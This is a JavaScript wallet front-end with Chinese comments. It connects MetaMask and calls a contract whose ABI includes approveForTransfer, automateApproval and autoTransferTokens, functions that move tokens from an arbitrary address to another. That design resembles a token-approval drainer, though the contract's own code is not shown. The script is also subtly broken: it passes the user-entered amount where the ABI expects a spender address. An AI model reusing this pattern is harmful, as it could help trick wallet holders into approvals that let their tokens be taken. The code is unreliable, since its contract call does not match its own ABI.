const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 替换为你的合约地址
const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "approveForTransfer",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "automateApproval",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			}
		],
		"name": "autoTransferTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

let userAccount;

// 连接钱包按钮事件
document.getElementById('connectWallet').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            // 请求连接 MetaMask 钱包
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = ethereum.selectedAddress;
            document.getElementById('approveTransfer').style.display = 'inline';
            document.getElementById('status').textContent = '钱包连接成功：' + userAccount;
        } catch (error) {
            document.getElementById('status').textContent = '连接钱包失败：' + error.message;
        }
    } else {
        document.getElementById('status').textContent = '请安装 MetaMask！';
    }
});

// 授权转移按钮事件
document.getElementById('approveTransfer').addEventListener('click', async () => {
    const tokenAddress = prompt("请输入代币地址："); // 代币合约地址
    const amount = prompt("请输入转移数量："); // 代币数量（最小单位）
    if (!tokenAddress || !amount) {
        document.getElementById('status').textContent = '请填写代币地址和转移数量！';
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        await contract.methods.approveForTransfer(tokenAddress, userAccount, amount).send({ from: userAccount });
        document.getElementById('status').textContent = '授权成功！';
    } catch (error) {
        console.error('授权时出错:', error); // 输出详细错误信息
        document.getElementById('status').textContent = '授权失败：' + error.message; // 显示用户友好的错误信息
    }
});
